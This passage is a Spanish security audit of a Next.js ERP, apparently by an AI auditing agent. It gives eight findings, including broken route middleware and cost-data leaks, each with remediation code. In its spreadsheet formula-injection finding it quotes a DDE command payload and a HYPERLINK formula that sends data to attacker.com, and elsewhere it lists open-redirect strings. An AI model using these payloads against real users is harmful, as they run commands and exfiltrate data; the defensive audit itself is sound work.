# Informe de Auditoría y Deep Research de Ciberseguridad: Frontend, SSR/RSC y Superficie Pública ERP Cendaro

**Fecha:** 31 de Octubre de 2026  
**Auditor:** `teamwork_explorer_frontend_public_1` (Agente Especializado en Seguridad Frontend, RSC y Vectores Públicos)  
**Objetivo:** ERP Cendaro (`apps/erp`, `packages/auth`, `packages/api`, `packages/validators`, `packages/db`)  
**Clasificación de Auditoría:** Benigna / Read-Only Source Code Security Assessment & Threat Modeling  
**Cumplimiento de Restricción:** Cero modificaciones a código fuente en `apps/` y `packages/`.

---

## 1. Resumen Ejecutivo

Se ha completado una investigación técnica profunda y exhaustiva sobre la superficie pública de ataque, la capa de renderizado híbrido Server Components (RSC) / Client Components, la gestión de sesiones y middleware, las cabeceras de seguridad y la ingestión de datos del ERP Cendaro.

La auditoría reveló **8 hallazgos principales** (1 Crítico, 3 Altos, 3 Medios, 1 Bajo), destacando una brecha arquitectónica crítica en la que **el middleware de protección de rutas de Next.js está completamente inoperativo en tiempo de ejecución**, permitiendo que cualquier usuario anónimo acceda a las rutas internas protegidas del ERP y reciba el shell de la aplicación sin autenticación. Adicionalmente, se identificó la serialización inadvertida de **precios de costo internos y márgenes comerciales** en los payloads RSC hidratados en el navegador, fuga horizontal de facturas fiscales del SENIAT a vendedores comisionistas, y ausencia de neutralización contra **Inyección de Fórmulas en Hojas de Cálculo (CSV/Formula Injection)**.

### Tabla Consolidada de Hallazgos

| ID            | Título del Hallazgo                                                                         | Severidad    | CVSS v3.1 | CWE / OWASP                        | Componente Afectado                                                                                      |
| ------------- | ------------------------------------------------------------------------------------------- | ------------ | --------- | ---------------------------------- | -------------------------------------------------------------------------------------------------------- |
| **SEC-FE-01** | Middleware de Edge Inoperativo por Renombrado de Archivo (`proxy.ts` vs `middleware.ts`)    | **CRITICAL** | 9.1       | CWE-284 / OWASP A01:2021           | `apps/erp/src/proxy.ts`                                                                                  |
| **SEC-FE-02** | Exposición de Precios de Costo y Proveedores en Payloads SSR/RSC a Roles No Autorizados     | **HIGH**     | 7.5       | CWE-200, CWE-213 / OWASP A01:2021  | `packages/api/src/modules/catalog.ts`<br/>`apps/erp/src/app/(app)/catalog/[id]/page.tsx`                 |
| **SEC-FE-03** | Fuga Horizontal de Facturas Fiscales SENIAT a Vendedores (Omisión de `vendorScopeId`)       | **HIGH**     | 7.4       | CWE-639 / OWASP A01:2021           | `packages/api/src/modules/fiscal.ts`<br/>`apps/erp/src/app/(app)/invoices/page.tsx`                      |
| **SEC-FE-04** | Inyección de Fórmulas en Exportaciones de Hojas de Cálculo (CSV / Formula Injection)        | **HIGH**     | 7.8       | CWE-1236 / OWASP A03:2021          | `apps/erp/src/lib/xlsx/download.ts`<br/>`apps/erp/src/lib/xlsx/workbook.ts`                              |
| **SEC-FE-05** | Vulnerabilidad de Bomba de Descompresión (Zip Bomb) en Extracción de Imágenes en Cliente    | **MEDIUM**   | 6.5       | CWE-400, CWE-776 / OWASP A04:2021  | `apps/erp/src/lib/parse-file-browser.ts`                                                                 |
| **SEC-FE-06** | Debilidad en CSP: `'unsafe-inline'` en `script-src` y Wildcard en `connect-src` / `img-src` | **MEDIUM**   | 5.7       | CWE-1021, CWE-358 / OWASP A05:2021 | `apps/erp/csp.mjs`                                                                                       |
| **SEC-FE-07** | Ausencia de Verificación de Mismo Origen (CSRF Defense-in-Depth) en tRPC y AI Ingest        | **MEDIUM**   | 5.3       | CWE-352 / OWASP A01:2021           | `apps/erp/src/app/api/trpc/[...trpc]/route.ts`<br/>`apps/erp/src/app/api/ai/parse-packing-list/route.ts` |
| **SEC-FE-08** | Carencia de Rate Limiting en Endpoints Públicos Financieros (`/api/bcv-rate` y `/exchange`) | **LOW**      | 4.3       | CWE-770 / OWASP A04:2021           | `apps/erp/src/app/api/bcv-rate/route.ts`<br/>`apps/erp/src/app/api/exchange/usd-cny/route.ts`            |

---

## 2. Hallazgos Detallados de Seguridad

### SEC-FE-01: Middleware de Edge Inoperativo por Renombrado de Archivo (`proxy.ts` vs `middleware.ts`)

- **Severidad:** **CRITICAL** (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — Base Score: 9.1)
- **Clasificación:** CWE-284 (Improper Access Control) / OWASP Top 10:2021 — A01: Broken Access Control
- **Componente Afectado:** `apps/erp/src/proxy.ts` (líneas 21-209), confirmado por `apps/erp/.next/server/middleware-manifest.json`
- **Mecanismo de Vulnerabilidad:**  
  En Next.js App Router (versión 16.4.3), el framework identifica y compila la lógica de Edge Middleware exclusivamente a través de la convención de nombres `middleware.ts` (o `middleware.js`) ubicado en la raíz del proyecto o dentro de `src/` (`src/middleware.ts`), exportando una función nombrada `middleware` o export default.

  En el historial del repositorio (commit `a404a93ccb3` y `b818ab2a5f2`), el archivo `src/middleware.ts` fue renombrado a `src/proxy.ts` y su función exportada fue cambiada a:

  ```typescript
  // apps/erp/src/proxy.ts:21
  export async function proxy(request: NextRequest) { ... }
  ```

  La auditoría empírica del artefacto de compilación generado en `apps/erp/.next/server/middleware-manifest.json` demuestra de forma irrefutable que Next.js no registra ningún middleware:

  ```json
  {
    "version": 3,
    "middleware": {},
    "sortedMiddleware": [],
    "functions": {}
  }
  ```

  Como consecuencia directa, **Next.js ejecuta la aplicación con CERO middleware en producción y desarrollo**. Ninguna de las 209 líneas de código de seguridad de `src/proxy.ts` es ejecutada por el runtime.

- **Impacto y Vectores de Explotación:**
  1. **Bypass Completo del Guardián de Rutas:** Cualquier atacante anónimo, crawler o script puede solicitar directamente rutas protegidas (`/dashboard`, `/catalog`, `/inventory`, `/pos`, `/audit`, `/alerts`, `/settings`). Debido a que `apps/erp/src/app/(app)/layout.tsx` silencia los fallos de prefetch (`catch { /* Prefetch failure is non-critical */ }`), el servidor renderiza el layout completo `<AppShell>` al atacante, exponiendo la estructura interna, menús de navegación, módulos y configuración del frontend.
  2. **Inoperatividad del Timeout de Inactividad:** El control de inactividad de 30 minutos basado en la cookie `cendaro-last-activity` (líneas 167-194 de `proxy.ts`) nunca se valida en navegación de páginas.
  3. **Omisión de Inyección de Cabeceras de Seguridad:** Las cabeceras `GLOBAL_SECURITY_HEADERS` (`X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Permissions-Policy`) definidas en `proxy.ts` para `/api/auth/*` nunca son inyectadas a nivel de proxy.
  4. **Omisión de Forwarding de `x-workspace-id`:** La sincronización entre la cookie `cendaro-workspace-id` y la cabecera `x-workspace-id` en el edge no ocurre.

- **Remediation Plan (Paso a Paso):**
  1. Renombrar `apps/erp/src/proxy.ts` a `apps/erp/src/middleware.ts`, o crear `apps/erp/src/middleware.ts` como wrapper delegador:
     ```typescript
     // apps/erp/src/middleware.ts
     import type { NextRequest } from "next/server";

     import { proxy } from "./proxy";

     export async function middleware(request: NextRequest) {
       return proxy(request);
     }

     export { config } from "./proxy";
     ```
  2. Actualizar la exportación dentro de `apps/erp/src/proxy.ts` para mantener coherencia:
     ```typescript
     export async function proxy(request: NextRequest) { ... }
     ```
  3. Añadir una prueba de integración unitaria en `apps/erp/src/lib/middleware-registration.test.ts` que valide que `apps/erp/src/middleware.ts` existe y exporta `middleware` y `config`.
  4. Ejecutar `pnpm build` y verificar que `.next/server/middleware-manifest.json` contenga la entrada `/middleware` poblada en `"middleware"`.

---

### SEC-FE-02: Exposición de Precios de Costo y Proveedores en Payloads SSR/RSC a Roles No Autorizados

- **Severidad:** **HIGH** (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — Base Score: 7.5)
- **Clasificación:** CWE-200 (Exposure of Sensitive Information) / CWE-213 (Exposure of Sensitive Information Due to Incompatible Policies) / OWASP A01:2021 — Broken Access Control
- **Componente Afectado:**
  - `packages/api/src/modules/catalog.ts` (líneas 276-330: procedimiento `productById`)
  - `apps/erp/src/app/(app)/catalog/[id]/page.tsx` (líneas 31-60: `CatalogDetailPrefetch`)
  - `packages/db/src/schema.ts` (línea 997: `Product.costAvg`, línea 1105: `ProductSupplier.cost`)
  - `packages/validators/src/authz.ts` (línea 118: `catalog: managed({ read: EVERYONE })`)
- **Mecanismo de Vulnerabilidad:**  
  La matriz de autorización (`packages/validators/src/authz.ts`) restringe estrictamente el módulo `pricing` a `MANAGEMENT` (`owner`, `admin`, `supervisor`). Roles como `employee` (cajeros, despacho), `vendor` (vendedores independientes) y `marketing` tienen prohibido acceder a los costos y márgenes de ganancia.

  Sin embargo, el módulo `catalog` permite lectura a `EVERYONE`:

  ```typescript
  // packages/validators/src/authz.ts:118
  catalog: managed({ read: EVERYONE }),
  ```

  En `packages/api/src/modules/catalog.ts`:

  ```typescript
  // catalog.ts:276
  productById: wsReadPermissionProcedure("catalog", "read")
    .input(z.object({ id: z.string().uuid() }))
    .query(async ({ ctx, input }) => {
      const [product] = await ctx.db
        .select()
        .from(Product)
        .where(...)
        .limit(1);

      const [attributes, prices, stockLedger, channelAllocations, uomEquivalences, productSuppliers] =
        await Promise.all([
          ...,
          ctx.db.select().from(ProductSupplier).where(eq(ProductSupplier.productId, input.id)),
        ]);

      return {
        ...product,
        attributes,
        prices,
        stockLedger,
        channelAllocations,
        uomEquivalences,
        productSuppliers,
      };
    });
  ```

  Nótese que:
  - `Product` contiene la columna `costAvg` (costo promedio ponderado de inventario).
  - `ProductSupplier` contiene la columna `cost` (precio de compra directo negociado con el proveedor).

  En `apps/erp/src/app/(app)/catalog/[id]/page.tsx`, el Server Component realiza el prefetch:

  ```typescript
  await queryClient.prefetchQuery(trpc.catalog.productById.queryOptions({ id }));
  return (
    <HydrationBoundary state={dehydrate(queryClient)}>
      <CatalogDetailClient />
    </HydrationBoundary>
  );
  ```

  Al llamar a `dehydrate(queryClient)`, Next.js serializa **todo el objeto devuelto por `productById` en el payload HTML / RSC streaming** (`self.__next_f.push(...)`).

- **Impacto y Vectores de Explotación:**  
  Cualquier usuario con rol `employee`, `vendor` o `marketing` que abra una ficha de producto en el ERP (o que envíe una consulta a `/api/trpc/catalog.productById?input=...`) recibe en texto claro en su navegador el costo de adquisición de cada producto y los costos de cada proveedor.

  Un vendedor comisionista o empleado desleal puede calcular de forma exacta el margen neto de la empresa sobre cada SKU, compartir información confidencial de costos con clientes o proveedores competidores, o negociar condiciones desventajosas para la empresa.

- **Remediation Plan (Paso a Paso):**
  1. En `packages/api/src/modules/catalog.ts`, modificar `productById` para verificar si el usuario tiene permisos de visualización de costos:
     ```typescript
     const canViewCosts =
       can(ctx.workspace.role, "pricing", "read") ||
       can(ctx.workspace.role, "containers", "read");
     ```
  2. Aplicar proyección condicional de campos sensibles:
     ```typescript
     const sanitizedProduct = {
       ...product,
       costAvg: canViewCosts ? product.costAvg : null,
     };
     const sanitizedSuppliers = productSuppliers.map((ps) => ({
       ...ps,
       cost: canViewCosts ? ps.cost : null,
     }));
     ```
  3. Asegurar que las interfaces TypeScript en `@cendaro/api` reflejen que `costAvg` y `supplier.cost` pueden ser `null` para roles operativos.

---

### SEC-FE-03: Fuga Horizontal de Facturas Fiscales SENIAT a Vendedores (Omisión de `vendorScopeId`)

- **Severidad:** **HIGH** (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — Base Score: 7.4)
- **Clasificación:** CWE-639 (Authorization Bypass Through User-Controlled Key) / OWASP A01:2021 — Broken Access Control
- **Componente Afectado:**
  - `packages/api/src/modules/fiscal.ts` (líneas 154-167: procedimiento `listInvoices`)
  - `apps/erp/src/app/(app)/invoices/page.tsx` (líneas 28-35)
  - `packages/validators/src/authz.ts` (líneas 128-132: `orders.read` incluye `vendor`)
- **Mecanismo de Vulnerabilidad:**  
  Para dar soporte a la consulta de notas de entrega y facturación desde el flujo de ventas, el procedimiento `fiscal.listInvoices` está protegido bajo el permiso `orders.read`:

  ```typescript
  // packages/api/src/modules/fiscal.ts:154
  listInvoices: wsReadPermissionProcedure("orders", "read")
    .input(
      z
        .object({
          documentType: z.enum(fiscalDocumentTypeEnum.enumValues).optional(),
          limit: z.number().int().min(1).max(200).default(50),
        })
        .optional(),
    )
    .query(async ({ ctx, input }) => {
      const wsId = ctx.workspace.workspaceId;
      const conditions = [eq(FiscalDocument.workspaceId, wsId)];
      if (input?.documentType) {
        conditions.push(eq(FiscalDocument.documentType, input.documentType));
      }

      return ctx.db
        .select()
        .from(FiscalDocument)
        .where(and(...conditions))
        .orderBy(desc(FiscalDocument.issuedAt))
        .limit(input?.limit ?? 50);
    });
  ```

  En el módulo `sales.ts`, los procedimientos respetan el principio de aislamiento de vendedores:

  ```typescript
  const vendorId = vendorScopeId(ctx);
  if (vendorId) {
    conditions.push(eq(Order.vendorId, vendorId));
  }
  ```

  Sin embargo, en `fiscal.ts`, **el desarrollador omitió completamente la verificación de `vendorScopeId(ctx)`**.

  Dado que el rol `vendor` tiene autorización `orders.read` en la matriz de roles, cualquier usuario con rol `vendor` tiene acceso legítimo a llamar `fiscal.listInvoices`.

- **Impacto y Vectores de Explotación:**  
  Cualquier vendedor de la empresa puede navegar a `/invoices` o invocar directamente `trpc.fiscal.listInvoices.query()` y descargar la totalidad de las facturas fiscales del workspace, incluyendo:
  - Cédulas y RIFs de todos los clientes (`buyerRif`).
  - Nombres comerciales y razones sociales completas (`buyerLegalName`).
  - Direcciones fiscales físicas de clientes (`buyerAddress`).
  - Montos totales facturados, bases imponibles y cobros de IGTF/IVA.
  - Facturación generada por otros vendedores y canales de venta directos.

  Esto constituye una fuga masiva de datos fiscales (PII y secretos comerciales) que infringe normas de confidencialidad comercial y protección de datos.

- **Remediation Plan (Paso a Paso):**
  1. En `packages/api/src/modules/fiscal.ts`, importar `vendorScopeId` desde `./sales` o extraerlo a un servicio común:
     ```typescript
     import { vendorScopeId } from "./sales";
     ```
  2. En `fiscal.listInvoices`, verificar si la sesión corresponde a un vendedor comisionista y restringir la consulta uniendo `FiscalDocument` con `Order` o `Customer`:
     ```typescript
     const vendorId = vendorScopeId(ctx);
     if (vendorId) {
       // Filtrar documentos fiscales pertenecientes a pedidos o clientes del vendedor
       conditions.push(
         sql`exists (
           select 1 from public.order o 
           where o.id = fiscal_document.order_id 
             and o.assigned_vendor_id = ${vendorId}::uuid
         )`,
       );
     }
     ```
  3. Añadir una prueba de regresión en `packages/api/src/__tests__/vendor-scope.test.ts` que valide que `fiscal.listInvoices` rechaza o filtra los documentos de otros vendedores cuando el llamador es un `vendor`.

---

### SEC-FE-04: Inyección de Fórmulas en Exportaciones de Hojas de Cálculo (CSV / Formula Injection)

- **Severidad:** **HIGH** (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H — Base Score: 7.8)
- **Clasificación:** CWE-1236 (Improper Neutralization of Formula Elements in a CSV or Similar Formatted Text) / OWASP A03:2021 — Injection
- **Componente Afectado:**
  - `apps/erp/src/lib/xlsx/download.ts` (líneas 13-35: `downloadAsXlsx`, `downloadMultiSheet`)
  - `apps/erp/src/lib/xlsx/workbook.ts` (líneas 26-57: `jsonToWorkbook`, `aoaToWorkbook`)
  - `apps/erp/src/modules/receiving/inventory-import/steps/result-summary.tsx` (línea 54)
- **Mecanismo de Vulnerabilidad:**  
  La aplicación proporciona capacidades de exportación a archivos Excel (`.xlsx`) mediante SheetJS (`xlsx` versión 0.20.3). La función central `jsonToWorkbook` en `apps/erp/src/lib/xlsx/workbook.ts` implementa:

  ```typescript
  // apps/erp/src/lib/xlsx/workbook.ts:26
  export function jsonToWorkbook<T extends object>(
    rows: T[],
    sheetName = "Sheet1",
  ): WorkBook {
    const ws = utils.json_to_sheet(rows);
    const wb = utils.book_new();
    utils.book_append_sheet(wb, ws, sheetName);
    return wb;
  }
  ```

  `utils.json_to_sheet` no realiza ninguna sanitización de caracteres especiales que disparan ejecución de fórmulas en Microsoft Excel, LibreOffice Calc o Google Sheets.

  Si un usuario almacena un nombre de producto, SKU, dirección de cliente, o mensaje de error de importación que inicia con los caracteres `=`, `+`, `-`, `@`, `\t`, o `\r` (por ejemplo: `=cmd|'/C powershell IEX ...'!A0` o `=HYPERLINK("http://attacker.com/leak?data=" & A1, "Error")`), SheetJS escribe el valor directamente como celda de texto/fórmula.

- **Impacto y Vectores de Explotación:**  
  Cuando un supervisor, administrador o contador descarga un reporte de discrepancias de inventario, catálogo o cobranzas y lo abre en Microsoft Excel:
  1. Excel interpreta la celda como una expresión ejecutable de Dynamic Data Exchange (DDE), solicitando ejecución de comandos en el sistema operativo local de la víctima.
  2. Mediante fórmulas `=HYPERLINK()` o `=WEBSERVICE()`, los datos de filas adyacentes (balances financieros, números de cédula, montos) son concatenados y enviados como parámetros GET a un servidor externo bajo control del atacante al hacer clic en la celda.

- **Remediation Plan (Paso a Paso):**
  1. Crear una función de neutralización de fórmulas en `apps/erp/src/lib/xlsx/formula-sanitize.ts`:
     ```typescript
     const DANGEROUS_FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r", "|"];

     export function sanitizeCellValue(val: unknown): unknown {
       if (typeof val !== "string") return val;
       if (
         DANGEROUS_FORMULA_PREFIXES.some((prefix) => val.startsWith(prefix))
       ) {
         // Prefijar con comilla simple (') para forzar interpretación como texto literal
         return `'${val}`;
       }
       return val;
     }

     export function sanitizeRows<T extends object>(rows: T[]): T[] {
       return rows.map((row) => {
         const clean: Record<string, unknown> = {};
         for (const [key, val] of Object.entries(row)) {
           clean[key] = sanitizeCellValue(val);
         }
         return clean as T;
       });
     }
     ```
  2. Actualizar `jsonToWorkbook` y `aoaToWorkbook` en `apps/erp/src/lib/xlsx/workbook.ts` para aplicar `sanitizeRows` antes de llamar a `utils.json_to_sheet(sanitizedRows)`.
  3. Crear una prueba unitaria que verifique que cadenas como `=cmd|' /C calc'!A0` y `@SUM(A1:A10)` son prefijadas con comilla simple al ser exportadas.

---

### SEC-FE-05: Vulnerabilidad de Bomba de Descompresión (Zip Bomb) en Extracción de Imágenes en Cliente

- **Severidad:** **MEDIUM** (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H — Base Score: 6.5)
- **Clasificación:** CWE-400 (Uncontrolled Resource Consumption) / CWE-776 (Improper Restriction of Recursive Entity References) / OWASP A04:2021 — Insecure Design
- **Componente Afectado:** `apps/erp/src/lib/parse-file-browser.ts` (líneas 240-274: `extractImagesFromXlsx`)
- **Mecanismo de Vulnerabilidad:**  
  En el backend (`apps/erp/src/app/api/ai/parse-packing-list/route.ts`), el equipo implementó protecciones defensivas contra bombas de descompresión:

  ```typescript
  // route.ts:107
  const MAX_ZIP_ENTRIES = 2000;
  const MAX_ZIP_UNCOMPRESSED_BYTES = 50 * 1024 * 1024; // 50MB
  ```

  Sin embargo, la arquitectura del ERP promueve la lectura y procesamiento de archivos en el navegador para evitar el límite de 4.5 MB de Vercel (`apps/erp/src/lib/parse-file-browser.ts`).

  En la función cliente `extractImagesFromXlsx`:

  ```typescript
  // parse-file-browser.ts:244
  const zip = await JSZip.loadAsync(buffer);
  const images: BrowserImage[] = [];
  let idx = 0;

  for (const [path, zipFile] of Object.entries(zip.files)) {
    if (idx >= MAX_TOTAL_IMAGES) break;
    if (zipFile.dir) continue;
    if (!path.startsWith("xl/media/")) continue;
    ...
    const blob = await zipFile.async("blob");
    ...
  }
  ```

  `JSZip.loadAsync(buffer)` analiza el directorio central del ZIP sin limitar el número de entradas, y si el archivo comprimido contiene miles de archivos ficticios bajo `xl/media/` o una entrada con un ratio de compresión extremo (zip bomb), el proceso de descompresión se ejecuta directamente en el hilo principal del navegador.

- **Impacto y Vectores de Explotación:**  
  Un usuario malicioso que cargue un archivo `.xlsx` especialmente modificado provocará la saturación de memoria de la pestaña del navegador, el congelamiento del motor JavaScript de V8 y la caída forzada de la aplicación (Client-Side Denial of Service).

- **Remediation Plan (Paso a Paso):**
  1. En `apps/erp/src/lib/parse-file-browser.ts`, antes de iterar sobre `zip.files`, validar las métricas del archivo comprimido:
     ```typescript
     const fileEntries = Object.keys(zip.files);
     if (fileEntries.length > 500) {
       throw new Error(
         "El archivo contiene demasiadas entradas internas (máximo 500).",
       );
     }
     ```
  2. Limitar el tamaño acumulado de descompresión de imágenes:
     ```typescript
     let totalDecompressedBytes = 0;
     const MAX_CLIENT_IMAGE_BYTES = 25 * 1024 * 1024; // 25 MB máximo total
     ```
  3. Abortar la extracción inmediatamente si una entrada excede los límites seguros.

---

### SEC-FE-06: Debilidad en CSP: `'unsafe-inline'` en `script-src` y Wildcard en `connect-src` / `img-src`

- **Severidad:** **MEDIUM** (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N — Base Score: 5.7)
- **Clasificación:** CWE-1021 / CWE-358 / OWASP A05:2021 — Security Misconfiguration
- **Componente Afectado:** `apps/erp/csp.mjs` (líneas 23-39) y `apps/erp/next.config.js` (líneas 56-85)
- **Mecanismo de Vulnerabilidad:**  
  La política de Content-Security-Policy generada en `apps/erp/csp.mjs` define:

  ```javascript
  // apps/erp/csp.mjs:26
  `script-src 'self' 'unsafe-inline'${isDev ? " 'unsafe-eval'" : ""} https://challenges.cloudflare.com`,
  ...
  "img-src 'self' data: blob: https://*.supabase.co",
  ...
  `connect-src 'self'${isDev ? " ws: wss:" : ""} https://*.supabase.co https://*.sentry.io https://challenges.cloudflare.com`,
  ```

  Dos problemas de diseño debilitan la postura de seguridad:
  1. **Presencia de `'unsafe-inline'`:** Al no utilizar hashes (`'sha256-...'`) ni nonces dinámicos en producción, la política no protege contra ataques de Cross-Site Scripting (XSS) basados en inyección de etiquetas `<script>` o controladores de eventos inline en el DOM.
  2. **Wildcard `https://*.supabase.co`:** Supabase es un servicio multi-inquilino abierto donde cualquier atacante puede crear un proyecto gratuito `https://xyz-attacker.supabase.co`. Al autorizar `*.supabase.co` en `connect-src` e `img-src`, un script inyectado mediante XSS puede exfiltrar credenciales o datos robados directamente a la base de datos o storage del atacante en Supabase sin que el navegador bloquee la conexión.

- **Impacto y Vectores de Explotación:**  
  En caso de presentarse una vulnerabilidad XSS en cualquier dependencia de terceros o componente de la UI, la política de CSP no impedirá la ejecución de código script inline ni bloqueará la exfiltración de información hacia dominios de Supabase controlados por terceros.

- **Remediation Plan (Paso a Paso):**
  1. En `apps/erp/csp.mjs`, restringir `connect-src` y `img-src` específicamente al subdominio del proyecto institucional (`https://ljwoptpaxazqmnhdczsb.supabase.co` o derivado de `NEXT_PUBLIC_SUPABASE_URL`):
     ```javascript
     const supabaseProjectUrl =
       process.env.NEXT_PUBLIC_SUPABASE_URL ||
       "https://ljwoptpaxazqmnhdczsb.supabase.co";
     const supabaseStorageOrigin = new URL(supabaseProjectUrl).origin;
     ```
  2. Reemplazar `https://*.supabase.co` por `${supabaseStorageOrigin}`.
  3. Planificar la migración de scripts estáticos (`REVEAL_BOOTSTRAP`, theme bootstrap) hacia hashes SHA-256 o nonces para remover `'unsafe-inline'` una vez que el soporte de Next.js para PPR lo permita de forma estable.

---

### SEC-FE-07: Ausencia de Verificación de Mismo Origen (CSRF Defense-in-Depth) en tRPC y AI Ingest

- **Severidad:** **MEDIUM** (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N — Base Score: 5.3)
- **Clasificación:** CWE-352 (Cross-Site Request Forgery) / OWASP A01:2021 — Broken Access Control
- **Componente Afectado:**
  - `apps/erp/src/app/api/trpc/[...trpc]/route.ts` (líneas 27-138)
  - `apps/erp/src/app/api/ai/parse-packing-list/route.ts` (líneas 800-890)
- **Mecanismo de Vulnerabilidad:**  
  El repositorio cuenta con una utilidad probada `isTrustedOrigin` (`apps/erp/src/lib/trusted-origin.ts`) que valida que las cabeceras `Origin` o `Referer` coincidan con el host del ERP. Dicha utilidad fue aplicada con éxito en `api/auth/create-user/route.ts` y `api/auth/logout/route.ts`.

  Sin embargo, en el handler principal de mutaciones `apps/erp/src/app/api/trpc/[...trpc]/route.ts` y en el endpoint de ingesta `apps/erp/src/app/api/ai/parse-packing-list/route.ts`, **la verificación de `isTrustedOrigin` fue omitida**.

  Aunque las cookies de sesión de Supabase utilizan el atributo `SameSite=Lax`, la ausencia de validación explícita de `Origin`/`Referer` en el manejador HTTP elimina la defensa en profundidad frente a peticiones cross-origin iniciadas mediante ataques de subdominios comprometidos, técnicas de DNS rebinding en redes corporativas locales, o anomalías de navegador en peticiones POST `text/plain`.

- **Impacto y Vectores de Explotación:**  
  Un sitio web malicioso en un subdominio no confiable o en la misma red podría forzar la ejecución de mutaciones tRPC o el consumo no autorizado de cuotas de inferencia en Groq AI si logra inducir al navegador a transmitir la sesión.

- **Remediation Plan (Paso a Paso):**
  1. En `apps/erp/src/app/api/trpc/[...trpc]/route.ts`:
     ```typescript
     import { isTrustedOrigin } from "~/lib/trusted-origin";

     // Dentro de handler para peticiones POST:
     if (req.method === "POST" && !isTrustedOrigin(req.headers, req.url)) {
       return new Response(
         JSON.stringify({
           error: { message: "Origen no autorizado", code: -32600 },
         }),
         {
           status: 403,
           headers: { "Content-Type": "application/json" },
         },
       );
     }
     ```
  2. Aplicar la misma validación en `apps/erp/src/app/api/ai/parse-packing-list/route.ts` antes de procesar el cuerpo de la solicitud.

---

### SEC-FE-08: Carencia de Rate Limiting en Endpoints Públicos Financieros (`/api/bcv-rate` y `/exchange`)

- **Severidad:** **LOW** (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L — Base Score: 4.3)
- **Clasificación:** CWE-770 (Allocation of Resources Without Limits or Throttling) / OWASP A04:2021 — Insecure Design
- **Componente Afectado:**
  - `apps/erp/src/app/api/bcv-rate/route.ts` (líneas 15-32)
  - `apps/erp/src/app/api/exchange/usd-cny/route.ts` (líneas 11-30)
- **Mecanismo de Vulnerabilidad:**  
  Ambos endpoints son públicos y accesibles sin autenticación. Aunque las tasas obtenidas se almacenan en una caché en memoria en la instancia por 15 minutos, los endpoints no cuentan con limitación de tasa por IP (`rateLimit`).

- **Impacto y Vectores de Explotación:**  
  Un atacante externo puede enviar cientos de miles de peticiones simultáneas contra `/api/bcv-rate` o `/api/exchange/usd-cny`, saturando la capacidad de concurrencia de las Serverless Functions en Vercel, elevando costos de infraestructura y provocando latencia para los usuarios legítimos del sistema.

- **Remediation Plan (Paso a Paso):**
  1. Incorporar la utilidad `rateLimit` en ambos manejadores:
     ```typescript
     import { rateLimit } from "~/lib/rate-limit";

     const rawIp = request.headers.get("x-forwarded-for") ?? "";
     const ip = rawIp.split(",")[0]?.trim() ?? "unknown";

     const { success: allowed, reset } = await rateLimit(`rate-api:${ip}`, {
       window: 60_000,
       max: 60, // 60 solicitudes por minuto por IP
     });
     if (!allowed) {
       return NextResponse.json(
         { error: "Límite de solicitudes excedido" },
         {
           status: 429,
           headers: {
             "Retry-After": String(Math.ceil((reset - Date.now()) / 1000)),
           },
         },
       );
     }
     ```

---

## 3. Auditoría Específica por Área de Enfoque

### 3.1 Superficie Pública, Rutas de Autenticación y Landing Page

- **Control de Fuerza Bruta y Login:** El endpoint `POST /api/auth/login` cuenta con una arquitectura de defensa en profundidad ejemplar:
  - Doble limitador de tasa deslizante: por IP (5 req / 60s) y por nombre de usuario (10 req / 15min).
  - Bloqueo duro escalonado (5m / 15m / 1h) indexado por el par `username:ip` para prevenir Denial of Service a cuentas de usuarios legítimos.
  - Mitigación completa de oráculos de temporización y enumeración de usuarios: ejecución en tiempo constante con email dummy (`no-reply.devnull@cendaro.internal.invalid`) y mensaje idéntico `"Credenciales incorrectas"`.
  - Integración con Cloudflare Turnstile CAPTCHA (`verifyTurnstileToken`).
- **Registro Público y Enrutamiento:** No existe registro público de cuentas anónimas. La creación de usuarios está centralizada en `POST /api/auth/create-user`, requiriendo sesión activa y rol `owner` o `admin` en `workspace_member`.
- **Invitaciones de Usuarios:** `workspace.inviteMember` responde de manera uniforme `{ ok: true }` sin relevar si el correo electrónico ya posee una cuenta registrada.
- **Redirecciones Abiertas (Open Redirect):** La función `sanitizeRedirectPath` en `apps/erp/src/lib/redirect-allowlist.ts` rechaza URLs absolutas, sintaxis de protocolo relativo (`//evil.com`), trucos de barra invertida (`/\evil.com`), y valida contra la lista blanca estricta de prefijos `REDIRECT_ALLOWLIST_PREFIX`.

### 3.2 Exposición de Datos en SSR y React Server Components (RSC)

- Los Server Components en `apps/erp/src/app/(app)/*` utilizan el patrón `dehydrate(queryClient)` para precargar datos en el servidor y acelerar el renderizado en cliente.
- **Vulnerabilidad Confirmada:** Los procedimientos tRPC que devuelven entidades completas mediante `.select()` (especialmente `catalog.productById` y `fiscal.listInvoices`) filtran inadvertidamente campos confidenciales (`costAvg`, `ProductSupplier.cost`, y facturas de otros vendedores) dentro de los bloques de hidratación de React transferidos al DOM.
- **Recomendación Global de RSC:** Ningún Server Component debe deshidratar consultas que contengan secretos de negocio hacia clientes que no cuenten con autorización para dichos datos. Se debe aplicar el principio de menor privilegio en los schemas de retorno de tRPC mediante DTOs explícitos.

### 3.3 Aislamiento de Variables de Entorno y Manejo de Secretos

- La configuración en `apps/erp/src/env.ts` utiliza `@t3-oss/env-nextjs` separando de forma estricta las variables `server` de las variables `client`.
- `SUPABASE_SERVICE_ROLE_KEY`, `GROQ_API_KEY`, `INTEGRATION_VAULT_KEY` y `CRON_SECRET` se encuentran declarados en el bloque `server` y no poseen el prefijo `NEXT_PUBLIC_`.
- La auditoría estática confirmó que no existen evaluaciones indebidas de variables de servidor en componentes marcados con `"use client"`.
- Los archivos `.env` y `.env.local` están estrictamente ignorados en `.gitignore` y no se detectaron secretos productivos comprometidos en el historial de Git.

### 3.4 Ingestión de Archivos y Seguridad en Cargas

